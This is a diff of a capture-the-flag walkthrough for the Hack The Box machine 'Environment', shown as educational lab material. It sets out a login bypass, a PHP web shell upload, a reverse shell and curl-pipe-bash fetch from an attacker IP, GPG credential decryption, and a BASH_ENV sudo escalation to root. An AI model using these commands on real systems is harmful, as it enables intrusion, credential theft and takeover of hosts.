@@ -3,12 +3,12 @@ name: Environment
 difficulty: medium
 os: linux
 platform: htb
-date: 9999
+date: 2025/08/12
 releasedDate: 2099-12-31
 userFlag: false
 rootFlag: false
 
-img: image_url
+img: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/757eeb9b0f530e71875f0219d0d477e4.png
 ---
 
 ## Enumeration
@@ -101,7 +101,9 @@ if(App::environment() == "preprod") { //QOL: login directly as me in dev/local/p
 }
 ```
 
-We can see that environment called `preprod` logs in as user with ID 1 without needing a password. We can use this to our advantage.
+## User Exploitation
+
+We can see that environment called `preprod` allows logging in as user with ID 1 without needing a password.
 
 ```bash
 POST /login?--env=preprod HTTP/1.1
@@ -111,6 +113,7 @@ email=test%40test.com&password=test&remember=nonboolean
 ```
 
 Now we are logged in as user `hish`. We get redirected to `/management/dashboard`.
+
 We can change our profile picture, maybe we can upload php code and execute it later.
 
 ```
@@ -144,27 +147,29 @@ PNG
 -----------------------------26383360799661928062804695699--
 ```
 
-Now we can acces the uploaded file at `http://environment.htb/storage/png3.php` and execute commands using the `cmd` parameter:
+Now we can access the uploaded file at `http://environment.htb/storage/png3.php` and execute commands using the `cmd` parameter:
 
 ```bash
 curl "http://environment.htb/storage/files/png3.php?cmd=whoami"
+```
 ```
 
 ...image data...
 www-data
 ...image data...
 
-````
+```
 
 We can get a reverse shell using the following commands:
-In our local machine:
+
+
 ```bash
 echo "bash -i >& /dev/tcp/10.10.14.216/443 0>&1" > reverse
 python3 -m http.server 80
 nc -lvnp 443
-````
+```
 
-We run the following request to the target machine:
+We can make a GET request to the `png3.php` file to execute the reverse shell command:
 
 ```
 GET /storage/files/png3.php?cmd=curl+10.10.14.216/reverse|bash HTTP/1.1
@@ -188,22 +193,88 @@ reset xterm
 export TERM=xterm
 ```
 
-We can check the web app database contents:
-
+Even we are `www-data`, we can see the user flag in the home directory of the user `hish`:
 ```bash
-sqlite3 database/database.sqlite .dump
+cat /home/hish/user.txt
 ```
 
 ```
-...
-CREATE TABLE IF NOT EXISTS "users" ("id" integer primary key autoincrement not null, "name" varchar not null, "email" varchar not null, "email_verified_at" datetime, "password" varchar not null, "remember_token" varchar, "created_at" datetime, "updated_at" datetime, "profile_picture" varchar);
-INSERT INTO users VALUES(1,'Hish','hish@environment.htb',NULL,'$2y$12$QPbeVM.u7VbN9KCeAJ.JA.WfWQVWQg0LopB9ILcC7akZ.q641r1gi',NULL,'2025-01-07 01:51:54','2025-01-12 01:01:48','hish.png');
-INSERT INTO users VALUES(2,'Jono','jono@environment.htb',NULL,'$2y$12$i.h1rug6NfC73tTb8XF0Y.W0GDBjrY5FBfsyX2wOAXfDWOUk9dphm',NULL,'2025-01-07 01:52:35','2025-01-07 01:52:35','jono.png');
-...
+user flag value
 ```
-
-## User Exploitation
 
 ## Root Exploitation
 
+We find there is a GPG file in the home directory of the user `hish`. So, we try to decrypt it:
+
+```bash
+cp -r /home/hish/.gnupg /tmp/.gnupg
+cp /home/hish/keyvault.gpg /tmp/keyvault.gpg
+
+chmod 700 /tmp/.gnupg
+chmod 600 /tmp/.gnupg/*
+
+gpg --homedir /tmp/.gnupg --decrypt /tmp/keyvault.gpg > /tmp/decrypted.txt
+cat /tmp/decrypted.txt
+```
+```
+PAYPAL.COM -> Ihaves0meMon$yhere123
+ENVIRONMENT.HTB -> marineSPm@ster!!
+FACEBOOK.COM -> summerSunnyB3ACH!!
+```
+
+We try to use `marineSPm@ster!!` as password to login via SSH:
+
+```bash
+ssh hish@environment.htb
+whoami
+```
+```
+hish
+```
+
+We check if we can use sudo to run commands as root:
+
+```bash
+sudo -l
+```
+```
+[sudo] password for hish: 
+Matching Defaults entries for hish on environment:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    env_keep+="ENV BASH_ENV", use_pty
+
+User hish may run the following commands on environment:
+    (ALL) /usr/bin/systeminfo
+```
+
+We see that there is a special option for the user `hish` while using `sudo`: 
+- `env_keep+="ENV BASH_ENV"` means that the environment variables `ENV` and `BASH_ENV` are preserved when running commands with `sudo`.
+
+These variables can hold scripts that are executed by the shell when it starts in interactive mode (for `ENV`) or when it starts in non-interactive mode (for `BASH_ENV`).
+
+We can use this to our advantage:
+```bash
+echo "#!/bin/bash
+chmod +s /bin/bash" > /tmp/pwn.sh
+chmod +x /tmp/pwn.sh
+export BASH_ENV=/tmp/pwn.sh
+sudo /usr/bin/systeminfo
+
+/bin/bash -p
+whoami
+```
+```
+root
+```
+
+We can see that we have a root shell now. We can find the root flag in the root directory:
+```bash
+cat /root/root.txt
+```
+```
+root flag value
+```
+
 ## Conclusion
+In this writeup, we successfully exploited the target machine by leveraging a misconfiguration in the login system to gain user access, then escalated our privileges to root by exploiting the environment variables preserved during `sudo` execution. We were able to retrieve both user and root flags, completing the challenge.
